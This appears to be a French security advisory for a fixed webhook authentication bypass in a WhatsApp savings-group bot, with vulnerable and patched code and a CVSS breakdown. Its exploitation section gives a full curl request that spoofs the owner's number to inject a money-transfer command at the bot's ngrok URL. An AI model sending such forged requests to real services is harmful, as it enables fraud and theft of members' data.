# Security Advisory — BADF-2026-001

## Identification

| Champ | Valeur |
|---|---|
| **ID** | BADF-2026-001 |
| **Titre** | Webhook Authentication Bypass via Predictable Instance Identifier |
| **Produit** | TontineBot Pro — KATECHON OS (`barack_corp_v9_18.py`) |
| **Version affectée** | v9.18 + PATCH 26 (Green API) avant PATCH 27 |
| **CWE** | CWE-290 — Authentication Bypass by Spoofing |
| **Sévérité** | **CRITICAL** |
| **Statut** | FIXED — PATCH 27 (commit `717dc99`, PR #6) |
| **Date de découverte** | 2026-06-29 |
| **Date de correction** | 2026-06-29 |
| **Découvreur** | Internal Security Review (/security-review) |

---

## Score CVSS v3.1

**Vecteur :** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`

**Score de base : 9.4 (CRITICAL)**

| Métrique | Valeur | Justification |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | Exploitable via URL ngrok publique et permanente depuis internet |
| Attack Complexity (AC) | **Low (L)** | L'`instanceId` est loggué en clair au démarrage du bot — aucune condition d'exploitation spéciale |
| Privileges Required (PR) | **None (N)** | Aucune authentification préalable requise |
| User Interaction (UI) | **None (N)** | Entièrement automatisable, aucune action victime nécessaire |
| Scope (S) | **Unchanged (U)** | L'attaquant reste dans le périmètre d'autorisation du bot |
| Confidentiality (C) | **High (H)** | Accès à toutes les données membres (PII, soldes, historique transactions) |
| Integrity (I) | **High (H)** | Déclenchement de paiements, confirmation de cotisations, modification d'états financiers |
| Availability (A) | **Low (L)** | Perturbation marginale du service possible |

### Calcul détaillé

```
ISCBase  = 1 - [(1 - 0.56) × (1 - 0.56) × (1 - 0.22)]
         = 1 - [0.44 × 0.44 × 0.78]
         = 1 - 0.151
         = 0.849

Impact   = 6.42 × ISCBase          (Scope Unchanged)
         = 6.42 × 0.849
         = 5.45

Exploit  = 8.22 × AV × AC × PR × UI
         = 8.22 × 0.85 × 0.77 × 0.85 × 0.85
         = 3.89

Score    = Roundup(min(5.45 + 3.89, 10))
         = Roundup(9.34)
         = 9.4
```

---

## Description technique

### Contexte

PATCH 26 a migré la couche WhatsApp de Meta Cloud API vers Green API. Contrairement à Meta (qui signe chaque webhook avec `X-Hub-Signature-256` — HMAC-SHA256 sur le body), Green API ne fournit pas de mécanisme de signature natif par défaut.

### Code vulnérable (PATCH 26, avant correction)

```python
@app.route("/webhook/whatsapp", methods=["POST"])
def webhook_whatsapp_greenapi():
    payload = request.get_json(force=True) or {}

    # VULNÉRABILITÉ : idInstance extrait du body JSON contrôlé par l'attaquant
    instance_id = str((payload.get("instanceData") or {}).get("idInstance", ""))
    if instance_id != str(GREENAPI_INSTANCE_ID):
        return jsonify({"status": "forbidden"}), 403
    # → bypass trivial : l'attaquant fournit la valeur de GREENAPI_INSTANCE_ID
    # → cette valeur est loggée en clair : log.info(f"WhatsApp : Green API — Instance {GREENAPI_INSTANCE_ID}")
```

`GREENAPI_INSTANCE_ID` est un identifiant numérique public (ex: `1234567890`) visible :
- Dans les logs de démarrage du bot
- Dans les URLs API sortantes qui l'exposent dans le path

Il ne constitue **pas** un secret partagé.

### Code corrigé (PATCH 27)

```python
@app.route("/webhook/whatsapp", methods=["POST"])
def webhook_whatsapp_greenapi():
    # Token secret 256-bit dans le query string — vérifié en constant-time
    if not GREENAPI_WEBHOOK_SECRET:
        return jsonify({"status": "misconfigured"}), 503
    incoming_token = request.args.get("token", "")
    if not hmac.compare_digest(incoming_token, GREENAPI_WEBHOOK_SECRET):
        log_audit("GREENAPI_TOKEN_INVALIDE", "Webhook token mismatch", request.remote_addr)
        return jsonify({"status": "forbidden"}), 403
    # ...
```

`hmac.compare_digest()` garantit une comparaison en temps constant (résistance aux timing attacks).

---

## Exploitation pas-à-pas

**Prérequis :** URL ngrok du bot (publique et permanente sur `lennox-unbiographical-jasmin.ngrok-free.app`)

**Étape 1 — Récupérer `GREENAPI_INSTANCE_ID`**
Via les logs de démarrage, les URLs sortantes visibles dans des traces réseau, ou par scan Shodan/CT logs sur le domaine ngrok.

**Étape 2 — Forger un événement avec usurpation owner**

```bash
curl -s -X POST https://lennox-unbiographical-jasmin.ngrok-free.app/webhook/whatsapp \
  -H "Content-Type: application/json" \
  -d '{
    "instanceData": {"idInstance": 1234567890},
    "typeWebhook": "incomingMessageReceived",
    "senderData": {"chatId": "237693969773@c.us"},
    "messageData": {
      "typeMessage": "textMessage",
      "textMessageData": {"textMessage": "VIREMENT 500000 +237XXXXXXXXX"}
    }
  }'
```

**Étape 3 — Résultat**

Le bot interprète `senderData.chatId` comme l'expéditeur réel. Puisque `chatId` contient le numéro de l'owner (`OWNER_WA`), la condition `wa == OWNER_WA` est vraie → `traiter_menu_owner()` est exécuté avec le texte forgé.

Les gardes internes (`est_owner(wa)`) vérifient uniquement `wa` — elles sont inopérantes face à un `wa` forgé.

---

## Impact

| Vecteur | Impact concret |
|---|---|
| Usurpation owner | Accès à toutes les commandes propriétaire (configuration, rapports, déblocages) |
| Usurpation membre | Soumission de confirmations de paiement fictives |
| Injection commandes financières | Déclenchement de transferts, annulation de dettes, modification de soldes |
| Extraction données | Accès aux données membres (PII, numéros téléphone, soldes, historique) |

---

## Correction

### PATCH 27 — commit `717dc99`

- Nouvelle variable d'environnement : `GREENAPI_WEBHOOK_SECRET` (token aléatoire 256-bit)
- Vérification par `hmac.compare_digest()` avant tout parsing du body
- Green API passe ce token automatiquement dans le query string de chaque appel webhook

### Configuration requise

1. Générer le secret :
   ```bash
   python -c "import secrets; print(secrets.token_hex(32))"
   ```
2. Ajouter dans `ENV` : `GREENAPI_WEBHOOK_SECRET=<valeur>`
3. Dashboard Green API → Settings → champ **webhookUrlToken** → même valeur
4. L'URL webhook configurée devient :
   ```
   https://lennox-unbiographical-jasmin.ngrok-free.dev/webhook/whatsapp?token=<valeur>
   ```

---

## Références

- CWE-290 : https://cwe.mitre.org/data/definitions/290.html
- CVSS v3.1 Specification : https://www.first.org/cvss/v3.1/specification-document
- CVSS v3.1 Calculator : https://www.first.org/cvss/calculator/3.1
- Commit de correction : `717dc99`
- Pull Request : #6

---

## Historique

| Date | Événement |
|---|---|
| 2026-06-29 | Vulnérabilité découverte lors du security review post-PATCH 26 |
| 2026-06-29 | PATCH 27 développé et mergé (PR #6) |
| 2026-06-29 | Advisory BADF-2026-001 publié |
